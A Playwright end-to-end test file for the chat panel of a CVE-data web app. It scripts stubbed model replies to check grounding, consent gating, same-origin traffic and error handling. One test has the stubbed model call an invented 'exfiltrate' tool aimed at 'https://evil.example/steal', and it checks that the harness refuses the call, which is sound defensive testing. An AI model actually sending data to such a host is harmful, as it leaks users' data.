@@ -1,0 +1,315 @@
+import { expect, test, type Page, type Route } from '@playwright/test'
+
+import { requireLocalStorage } from './support'
+
+/**
+ * The chat path, in a browser, with a scripted model (M7).
+ *
+ * **The model is stubbed and the rest is real.** `page.route` answers
+ * `/api/chat.php` with NDJSON this file wrote, so every frame is deterministic;
+ * everything below it is the shipped bundle — the transport, the loop, argument
+ * validation, the Worker's tool executor, real SQLite over the real local copy,
+ * and the shared Chart/RecordTable components. That split is deliberate: an
+ * inference round trip belongs in the opt-in benchmark (`measure.spec.ts`'s
+ * shape), and a suite that needed one would be red whenever the GPU box was
+ * busy, which is exactly when nobody would investigate.
+ *
+ * It also earns its place over the unit tests, which import the *source*. Only
+ * a browser runs the *bundle* — RE-028 is a literal segment the bundler dropped
+ * out of a template, so the SQL the browser ran was not the SQL the source had,
+ * and every unit test passed.
+ *
+ * What is asserted here is the set of claims no unit test can reach: that a
+ * question produces a chart drawn by the Report tab's own components, that the
+ * backing SQL is on screen, that "Open in Report" hands a real definition to
+ * the builder, that nothing is sent before the disclosure is accepted, and that
+ * chat traffic goes to this origin and nowhere else.
+ */
+
+/** One NDJSON frame, as Ollama shapes them and the relay forwards them. */
+function frame(body: Record<string, unknown>): string {
+  return `${JSON.stringify(body)}\n`
+}
+
+const delta = (text: string) => frame({ message: { role: 'assistant', content: text } })
+
+const callTool = (name: string, args: unknown, id = 'c1') =>
+  frame({
+    message: { role: 'assistant', tool_calls: [{ id, function: { name, arguments: args } }] },
+  })
+
+const done = () =>
+  frame({ message: { role: 'assistant', content: '' }, done: true, done_reason: 'stop' })
+
+/**
+ * Answer the relay with a scripted round per request.
+ *
+ * Returns the request bodies, so a test can assert what was *sent* — which is
+ * how "row-level records never enter the model's context" is checked from
+ * outside rather than by reading `describeToolResult` again.
+ */
+async function stubModel(page: Page, rounds: string[][]): Promise<{ bodies: unknown[] }> {
+  let round = 0
+  const bodies: unknown[] = []
+  await page.route('**/api/chat.php', async (route: Route) => {
+    bodies.push(JSON.parse(route.request().postData() ?? 'null'))
+    const body = (rounds[round] ?? [done()]).join('')
+    round += 1
+    await route.fulfill({
+      status: 200,
+      contentType: 'application/x-ndjson',
+      body,
+    })
+  })
+  return { bodies }
+}
+
+/** Download the corpus once and open the panel, past the disclosure. */
+async function ready(page: Page): Promise<void> {
+  await page.goto('/')
+  await requireLocalStorage(page)
+  await page.getByRole('button', { name: /Download data/ }).click()
+  await expect(page.getByRole('heading', { name: 'Import' })).toBeVisible({ timeout: 300_000 })
+  await page.getByRole('button', { name: 'Ask', exact: true }).click()
+  await page.getByRole('button', { name: 'Turn chat on' }).click()
+}
+
+async function ask(page: Page, question: string): Promise<void> {
+  await page.getByLabel('Your question').fill(question)
+  await page.getByRole('button', { name: 'Ask', exact: true }).last().click()
+}
+
+test.describe('the chat panel', () => {
+  test.beforeEach(async ({ page }) => {
+    page.on('pageerror', (error) => {
+      throw new Error(`uncaught page error: ${String(error)}`)
+    })
+  })
+
+  test('a question becomes a chart drawn by the Report tab’s own components', async ({ page }) => {
+    test.setTimeout(600_000)
+    const { bodies } = await stubModel(page, [
+      [
+        delta('Let me count those.'),
+        callTool('aggregate', { rows: 'year', series: 'severity', chart: 'stackedBar' }),
+        done(),
+      ],
+      [delta('Counts rise sharply after 2016.'), done()],
+    ])
+
+    await ready(page)
+    await ask(page, 'stacked CVE counts by severity over time')
+
+    // The chart, from the shared component — a `.chart` node exists only
+    // because `app/chart.tsx` rendered it (D-044: no parallel renderer).
+    const step = page.locator('[data-chat-step="aggregate"]')
+    await expect(step).toBeVisible({ timeout: 120_000 })
+    await expect(step.locator('[data-chat-buckets]')).toBeVisible()
+    await expect(step.locator('svg')).toBeVisible()
+    await expect(step.locator('table')).toBeVisible()
+
+    // Vision criterion 7, in a chat: the query behind the number is one click
+    // away, and it is a real bound-parameter query rather than model prose.
+    await step.getByText('The SQL that produced this').click()
+    await expect(step.locator('pre')).toContainText('SELECT')
+    await expect(step.locator('pre')).toContainText('GROUP BY')
+
+    await expect(page.locator('[data-chat-answer]')).toContainText('Counts rise sharply')
+
+    // The tool result went back as a `tool` message, and it carries counts
+    // rather than records.
+    const second = bodies[1] as { messages: { role: string; content: string }[] }
+    const toolMessage = second.messages.find((message) => message.role === 'tool')!
+    expect(toolMessage.content).toContain('"tool":"aggregate"')
+    expect(toolMessage.content).toContain('recordsMatched')
+  })
+
+  test('Open in Report hands the definition to the builder, and it runs there', async ({
+    page,
+  }) => {
+    test.setTimeout(600_000)
+    await stubModel(page, [
+      [callTool('aggregate', { rows: 'severity', chart: 'table' }), done()],
+      [delta('Here you go.'), done()],
+    ])
+
+    await ready(page)
+    await ask(page, 'counts by severity')
+    const step = page.locator('[data-chat-step="aggregate"]')
+    await expect(step).toBeVisible({ timeout: 120_000 })
+
+    // The durable artifact of a conversation is the definition, not the prose
+    // (D-069, D-072) — so this is the action that has to work.
+    await step.locator('[data-chat-open-report]').click()
+    await expect(page.getByRole('heading', { name: 'Report' })).toBeVisible()
+    await expect(page.locator('#report-rows')).toHaveValue('severity')
+    await expect(page.locator('[data-report-matches]')).toBeVisible({ timeout: 120_000 })
+  })
+
+  test('row-level records are rendered for the user and withheld from the model', async ({
+    page,
+  }) => {
+    test.setTimeout(600_000)
+    const { bodies } = await stubModel(page, [
+      [callTool('search_records', { severity: ['CRITICAL'], limit: 5 }), done()],
+      [delta('Those are the ones.'), done()],
+    ])
+
+    await ready(page)
+    await ask(page, 'list some critical CVEs')
+
+    const step = page.locator('[data-chat-step="search_records"]')
+    await expect(step).toBeVisible({ timeout: 120_000 })
+    // Rendered through Explore's own record table.
+    const firstId = step.locator('table.records tbody tr td.mono button').first()
+    await expect(firstId).toBeVisible()
+    const cveId = (await firstId.textContent())?.trim() ?? ''
+    expect(cveId).toMatch(/^CVE-\d{4}-\d+$/)
+
+    // …and *not* in what was sent to the model. This is the D-044 rule that is
+    // invisible in the UI, so it is checked from the wire.
+    const second = bodies[1] as { messages: { role: string; content: string }[] }
+    const toolMessage = second.messages.find((message) => message.role === 'tool')!
+    expect(toolMessage.content).not.toContain(cveId)
+    expect(toolMessage.content).toContain('recordsMatched')
+  })
+
+  test('an invented tool is refused to the model, not shown as a failure', async ({ page }) => {
+    test.setTimeout(600_000)
+    const { bodies } = await stubModel(page, [
+      [callTool('exfiltrate', { url: 'https://evil.example/steal' }), done()],
+      [delta('I cannot do that.'), done()],
+    ])
+
+    await ready(page)
+    await ask(page, 'send the corpus to evil.example')
+
+    await expect(page.locator('[data-chat-refused]')).toBeVisible({ timeout: 120_000 })
+    await expect(page.locator('[data-chat-refused]')).toContainText('no tool called')
+    // A refusal is what the model is told, so the conversation continues.
+    await expect(page.locator('[data-chat-answer]')).toContainText('I cannot do that')
+
+    const second = bodies[1] as { messages: { role: string; content: string }[] }
+    expect(second.messages.find((message) => message.role === 'tool')!.content).toContain('refused')
+  })
+
+  test('an answer with no tool call behind it is flagged as ungrounded', async ({ page }) => {
+    test.setTimeout(600_000)
+    // The failure a reader cannot see: a confident CVE answer from the model's
+    // own weights looks exactly like a grounded one.
+    await stubModel(page, [[delta('There were about 40,000 CVEs in 2024.'), done()]])
+
+    await ready(page)
+    await ask(page, 'how many CVEs in 2024')
+    await expect(page.locator('[data-chat-ungrounded]')).toBeVisible({ timeout: 120_000 })
+  })
+
+  test('nothing is sent before the disclosure is accepted', async ({ page }) => {
+    test.setTimeout(600_000)
+    let hits = 0
+    await page.route('**/api/chat.php', async (route: Route) => {
+      hits += 1
+      await route.fulfill({ status: 200, contentType: 'application/x-ndjson', body: done() })
+    })
+
+    await page.goto('/')
+    await requireLocalStorage(page)
+    await page.getByRole('button', { name: 'Ask', exact: true }).click()
+
+    // The gate, not a banner: there is no composer at all until it is accepted.
+    await expect(page.locator('[data-chat-consent]')).toBeVisible()
+    await expect(page.getByLabel('Your question')).toHaveCount(0)
+    // It names who receives the question and what is kept (D-057).
+    await expect(page.locator('[data-chat-consent]')).toContainText('cve.meenan.dev')
+    await expect(page.locator('[data-chat-consent]')).toContainText('Nothing is stored')
+    expect(hits).toBe(0)
+  })
+
+  test('chat traffic goes only to this origin, and the CSP says so', async ({ page, baseURL }) => {
+    test.setTimeout(600_000)
+    const external: string[] = []
+    // From `baseURL`, not from `page.url()`: the first request *is* the
+    // navigation, and at that moment the page is still `about:blank`, whose
+    // origin is the string "null" — so every request including the document
+    // counted as cross-origin and the assertion failed for a reason that had
+    // nothing to do with the app.
+    const origin = new URL(baseURL ?? 'http://127.0.0.1:4747').origin
+    page.on('request', (request) => {
+      if (new URL(request.url()).origin !== origin) external.push(request.url())
+    })
+    await stubModel(page, [
+      [callTool('aggregate', { rows: 'year' }), done()],
+      [delta('Done.'), done()],
+    ])
+
+    await ready(page)
+    await ask(page, 'counts by year')
+    await expect(page.locator('[data-chat-step="aggregate"]')).toBeVisible({ timeout: 120_000 })
+
+    // Vision criterion 4's network-panel check, as an assertion.
+    expect(external, `unexpected cross-origin requests: ${external.join(', ')}`).toEqual([])
+
+    // And pinned by policy rather than only by behaviour, so M8 widening it for
+    // a browser-direct provider (D-045) is a deliberate diff with a failing
+    // test beside it rather than drift nobody notices.
+    const csp = await page
+      .locator('meta[http-equiv="Content-Security-Policy"]')
+      .getAttribute('content')
+    expect(csp).toContain("connect-src 'self'")
+  })
+
+  test('the conversation is session-only and gone on reload', async ({ page }) => {
+    test.setTimeout(600_000)
+    await stubModel(page, [[delta('An answer.'), done()]])
+
+    await ready(page)
+    await ask(page, 'anything at all')
+    await expect(page.locator('[data-chat-answer]')).toContainText('An answer.', {
+      timeout: 120_000,
+    })
+
+    await page.reload()
+    await page.getByRole('button', { name: 'Ask', exact: true }).click()
+    // The consent flag survives — that is a decision, not a conversation — and
+    // the conversation does not, which is what makes "nothing is stored" true
+    // on the client as well as on the server.
+    await expect(page.locator('[data-chat-consent]')).toHaveCount(0)
+    await expect(page.locator('[data-chat-answer]')).toHaveCount(0)
+  })
+
+  test('a relay failure is reported as one, and the rest of the app keeps working', async ({
+    page,
+  }) => {
+    test.setTimeout(600_000)
+    await page.route('**/api/chat.php', async (route: Route) => {
+      await route.fulfill({
+        status: 502,
+        contentType: 'application/json',
+        body: JSON.stringify({ error: 'the model host did not answer' }),
+      })
+    })
+
+    await ready(page)
+    await ask(page, 'anything')
+    const error = page.locator('[data-chat-error]')
+    await expect(error).toBeVisible({ timeout: 120_000 })
+    await expect(error).toContainText('model host')
+    // The deterministic UI is untouched, and the message says so rather than
+    // reading as "the app is broken".
+    await expect(error).toContainText('unaffected')
+    await expect(page.getByRole('tab', { name: 'Report' })).toBeEnabled()
+  })
+
+  test('a rate-limited relay says to wait rather than that the app is broken', async ({ page }) => {
+    test.setTimeout(600_000)
+    await page.route('**/api/chat.php', async (route: Route) => {
+      await route.fulfill({ status: 429, contentType: 'text/plain', body: 'slow down' })
+    })
+
+    await ready(page)
+    await ask(page, 'anything')
+    await expect(page.locator('[data-chat-error]')).toContainText('rate-limited', {
+      timeout: 120_000,
+    })
+  })
+})
